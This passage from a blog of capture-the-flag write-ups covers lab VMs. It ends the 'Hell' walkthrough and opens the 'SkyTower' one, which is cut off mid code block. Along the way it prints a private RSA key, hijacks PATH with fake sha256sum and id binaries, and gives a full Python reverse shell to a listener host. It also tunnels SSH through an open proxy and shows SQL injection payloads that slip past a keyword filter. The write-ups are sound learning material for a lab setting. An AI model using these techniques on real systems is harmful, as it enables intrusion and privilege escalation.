<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt container.tc
</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>:
</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore
</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
</span><span class='line'>
</span><span class='line'>george@hell:~<span class="nv">$ </span><span class="nb">cd</span> /media/truecrypt1/
</span><span class='line'>george@hell:/media/truecrypt1<span class="nv">$ </span>ls -lah
</span><span class='line'>total 22K
</span><span class='line'>drwx------ 2 george george  16K Jan  1  1970 .
</span><span class='line'>drwxr-xr-x 4 root   root   4.0K Jul 21 18:50 ..
</span><span class='line'>-rwx------ 1 george george 1.7K Jul  5 20:01 id_rsa
</span><span class='line'>george@hell:/media/truecrypt1<span class="nv">$ </span>cat id_rsa
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
</span><span class='line'>25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
</span><span class='line'>f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
</span><span class='line'>t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
</span><span class='line'>Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
</span><span class='line'>gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
</span><span class='line'>dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
</span><span class='line'>0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
</span><span class='line'>icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
</span><span class='line'>AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
</span><span class='line'>GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
</span><span class='line'>w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
</span><span class='line'>jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
</span><span class='line'>6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
</span><span class='line'>awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
</span><span class='line'>Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
</span><span class='line'>R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
</span><span class='line'>2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
</span><span class='line'>EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
</span><span class='line'>EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
</span><span class='line'>YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
</span><span class='line'>W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
</span><span class='line'>ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
</span><span class='line'>rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
</span><span class='line'>qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM<span class="o">=</span>
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span><span class='line'>george@hell:/media/truecrypt1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the <code>/etc/passwd</code>. I saved the key to a file on my Kali Linux box and attempted to SSH in as <code>bazza</code>, specifying the private key to use:</p>

<figure class='code'><figcaption><span>ssh access as Bazza</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh bazza@192.168.56.102 -i truecrypt_id_rsa
</span><span class='line'>Linux hell 3.2.0-4-486 <span class="c">#1 Debian 3.2.57-3+deb7u2 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Mon Jul 21 18:52:50 2014 from 192.168.56.1
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>becoming oj</h2>

<p><code>bazza</code> had 2 interesting files in hes home directory:</p>

<figure class='code'><figcaption><span>Bazza Home</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bazza@hell:~<span class="nv">$ </span>ls -lh
</span><span class='line'>total 20K
</span><span class='line'>-rw-r--r-- 1 root root        109 Jul  6 18:32 barrebas.txt
</span><span class='line'>-r-xr-sr-x 1 oj   developers 6.1K Jul  6 18:39 part1
</span><span class='line'>-r-sr-xr-x 1 oj   oj         5.2K Jul  6 18:34 part2
</span></code></pre></td></tr></table></div></figure>


<p>The <code>barrebas.txt</code> looks to be a shoutout to the tester of the vulns. <code>part1</code> &amp; <code>part2</code> from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is <code>oj</code>. Running <code>part1</code> and <code>part2</code>:</p>

<figure class='code'><figcaption><span>bazza puzzle</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bazza@hell:~<span class="nv">$ </span>./part1
</span><span class='line'>Checking integrity of part2... Done!!
</span><span class='line'>
</span><span class='line'>Checking integrity of calling target... Done!!
</span><span class='line'>
</span><span class='line'>Binary and target confirmed.
</span><span class='line'>
</span><span class='line'>Can<span class="err">&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1003<span class="o">(</span>developers<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span>,1004<span class="o">(</span>bazza<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>bazza@hell:~<span class="nv">$ </span>./part2
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Error! 1004 ID detected ... youre not allowed to run this, please use part 1!
</span><span class='line'>bazza@hell:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>So it seems that part2 is protected apparently due to the fact that our uid (or groupid?) of 1004 was not allowed. Slightly cryptic, but a few thoughts about what the binaries are doing were already going about. <code>part1</code> outputs what looks like the output of the <code>id</code> command too.</p>

<p>Again, this part took some time and resulted in a rabbit-hole scenario of try something, google something, try something, google something. I am not going to go through everything I have tried for this part, but simply try depict how I managed to figure this out in the end.</p>

<p>We start with a <code>strings</code> of <code>part1</code>:</p>

<figure class='code'><figcaption><span>part1 strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bazza@hell:~<span class="nv">$ </span>strings part1
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>_IO_stdin_used
</span><span class='line'>puts
</span><span class='line'>popen
</span><span class='line'><span class="nb">printf</span>
</span><span class='line'>fgets
</span><span class='line'>system
</span><span class='line'>pclose
</span><span class='line'>strcmp
</span><span class='line'>__libc_start_main
</span><span class='line'>GLIBC_2.1
</span><span class='line'>GLIBC_2.0
</span><span class='line'>PTRh
</span><span class='line'>QVhl
</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
</span><span class='line'>900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2
</span><span class='line'>1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id
</span><span class='line'>Checking integrity of part2...
</span><span class='line'>sha256sum /home/bazza/part2
</span><span class='line'>Failed to run <span class="nb">command</span>
</span><span class='line'><span class="nb"> </span>Done!!
</span><span class='line'>Checking integrity of calling target...
</span><span class='line'>sha256sum /usr/bin/id
</span><span class='line'>Uh oh.... Corrupted or in wrong directory <span class="o">(</span>/home/bazza/<span class="o">)</span>
</span><span class='line'> Done!!
</span><span class='line'>Binary and target confirmed.
</span><span class='line'>/home/bazza/part2
</span><span class='line'>Target corrupt
</span><span class='line'><span class="p">;</span>*2<span class="nv">$&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This should give you a pretty good idea of what is potentially going on in the binary, like:</p>

<ul>
<li> Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1</li>
<li> Check the sha256sum of /usr/bin/id matches 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8</li>
<li> Eventually Fail if these don’t match.</li>
</ul>


<p>The key lies in the fact that the <code>sha256sum</code> command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the <code>chmod</code> earlier, we are going to do exactly the same with the <code>sha256sum</code>.</p>

<p>As before, we create a <em>evil sha256sum</em> command, which is actually just a python script to spawn <code>/bin/sh</code>, then prefix <code>PATH</code> with <code>/tmp</code> and run <code>./part1</code>. For this one however, I was having trouble with the pty.spawn() and didn&rsquo;t really feel like troubleshooting that much. So I opted for a (reverse shell)[<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>] payload instead to open on a netcat listener that I have on my host laptop:</p>

<figure class='code'><figcaption><span>Reverse Shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;192.168.56.1&quot;</span><span class="p">,</span><span class="mi">4444</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s">&quot;-i&quot;</span><span class="p">])</span>
</span></code></pre></td></tr></table></div></figure>


<p>I spawned a <code>netcat</code> listener on my laptop using <code>nc -l 4444</code>, and ran <code>./part1</code>:</p>

<figure class='code'><figcaption><span>Answered netcat</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>→ nc -l 4444
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1003<span class="o">(</span>developers<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Notice that I was now in the <code>developers</code> group. I was now allowed to run <code>./part2</code> too&hellip; with a verbose line showing me the permissions I would need to gain access to <code>/home/oj</code>:</p>

<figure class='code'><figcaption><span>bazza Part2 test</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./part2
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1003<span class="o">(</span>developers<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span>,1004<span class="o">(</span>bazza<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Can<span class="err">&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>And, as expected, I spent some time on this binary too. I didn&rsquo;t expect <code>part2</code> to be any easier :P
After taking a break, I realized that the output that looks like that of <code>/usr/bin/id</code>, probably <strong>is</strong> that if it. So, off I went and did another <code>sha256sum</code>, type script, this time just with another reverse shell to port 4445, and naming it <code>id</code> so that part2 will pick it up:</p>

<figure class='code'><figcaption><span>bazza Part2 reverse shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>→ nc -l 4445
</span><span class='line'><span class="nv">$ </span>/usr/bin/id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1003<span class="o">(</span>developers<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span>,1004<span class="o">(</span>bazza<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd</span> /home/oj
</span><span class='line'><span class="nv">$ </span>ls -lh
</span><span class='line'>total 584K
</span><span class='line'>-r-sr-xr-x 1 root root 579K Jul  5 21:12 <span class="nb">echo</span>
</span><span class='line'>-rw-r--r-- 1 root root  154 Jul  5 21:06 How to be an infosec rockstar 101.txt
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>And there we are! Group membership for <code>oj</code>, and access to <code>/home/oj</code></p>

<h2>becoming root</h2>

<p>As with all of the other users, I added myself a ssh key for easy access.</p>

<p>Now, sadly I have to admit that this is as far as I have been able to come. <code>oj</code> has a binary called <code>echo</code> (not to be confused with the builtin echo), that, as expected, will echo what you input.</p>

<figure class='code'><figcaption><span>oj&#8217;s echo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>oj@hell:~<span class="nv">$ </span>./echo onetwothree
</span><span class='line'>onetwothree
</span><span class='line'>oj@hell:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I toyed with the inputs and noticed that when I entered inputs prefixed with a %, some strange stuff started to happen. Google helped me towards learning that this is what is called a <a href="https://www.owasp.org/index.php/Format_string_attack">Format String Attack</a></p>

<figure class='code'><figcaption><span>Format String Thing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>oj@hell:~<span class="nv">$ </span>./echo %08x.%08x.%08x
</span><span class='line'>080488c0.bffffcf8.00000000
</span><span class='line'>oj@hell:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I am however satisfied that I have come this far, and will definitely endeavor to nail this format string vuln sometime. But that time is not now.</p>

<p><strong>Edit:</strong> One way to root the machine is to make use of the fact that you can run <code>truecrypt</code> as <code>root</code>, and provide a evil container, spawning you a <code>root</code> shell. An example of this can be seen <a href="http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/">here</a> (and actually references this VM)</p>

<h2>summary</h2>

<p>Hell sure as heck taught me a lot and was one fun experience! Shoutout to <a href="https://twitter.com/@0x42424242">@0x42424242</a> for the time taken to make this VM available.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Climbing the SkyTower]]></title>
    <link href="http://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/"/>
    <updated>2014-07-17T18:20:12+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/07/17/climbing-the-skytower</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Recently, at a local Security Conference, <a href="https://twitter.com/telspacesystems">@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href="http://vulnhub.com/entry/skytower-1,96/">VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>

<p>In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)</p>

<!--more-->


<h2>starting off</h2>

<p>The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.</p>

<p>The home page presented you with a login screen and a 2.5MB &lsquo;background.jpg&rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud <em>NOPE</em>. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.</p>

<figure class='code'><figcaption><span>SkyTower Nmap results</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nmap --reason -Pn 192.168.137.242
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-07-17 18:32 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.137.242
</span><span class='line'>Host is up, received user-set <span class="o">(</span>0.0020s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 997 closed ports
</span><span class='line'>Reason: 997 conn-refused
</span><span class='line'>PORT     STATE    SERVICE    REASON
</span><span class='line'>22/tcp   filtered ssh        no-response
</span><span class='line'>80/tcp   open     http       syn-ack
</span><span class='line'>3128/tcp open     squid-http syn-ack
</span></code></pre></td></tr></table></div></figure>


<p>Next morning I reviewed the results and continued to poke around.</p>

<h2>learn all you can</h2>

<p>With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:</p>

<figure class='code'><figcaption><span>SSH Access via open proxy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>telnet 192.168.137.242 3128
</span><span class='line'>Trying 192.168.137.242...
</span><span class='line'>Connected to 192.168.137.242.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'>CONNECT 127.0.0.1:22
</span><span class='line'>HTTP/1.0 200 Connection established
</span><span class='line'>
</span><span class='line'>SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
</span><span class='line'>^<span class="o">]</span>
</span><span class='line'>telnet&gt; quit
</span><span class='line'>Connection closed.
</span></code></pre></td></tr></table></div></figure>


<p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&hellip;</p>

<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> &amp; <code>password</code></p>

<p>A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password <code>'</code> resulted in:</p>

<figure class='code'><figcaption><span>SQLi Reveal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>There was an error running the query <span class="o">[</span>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">&#39;&#39;&#39;&#39;</span><span class="err">&#39;</span> at line 1<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:</p>

<figure class='code'><figcaption><span>SkyTower keyword removal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; OR 1=1#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'>There was an error running the query <span class="o">[</span>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">&#39;11#&#39;&#39; at line 1]%</span>
</span><span class='line'>
</span><span class='line'><span class="s1">$ curl --data &quot;email=foo@bar&amp;password=&#39;</span>1 OR <span class="nv">1</span><span class="o">=</span>1#<span class="err">&quot;</span> http://192.168.137.242/login.php
</span><span class='line'>There was an error running the query <span class="o">[</span>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">&#39;1  11#&#39;</span><span class="err">&#39;</span> at line 1<span class="o">]</span>%
</span></code></pre></td></tr></table></div></figure>


<p>Ok, so no <code>OR</code>. Thats ok, we can substitute this easily with <code>||</code>.</p>

<figure class='code'><figcaption><span>SkyTower Auth Bypass</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
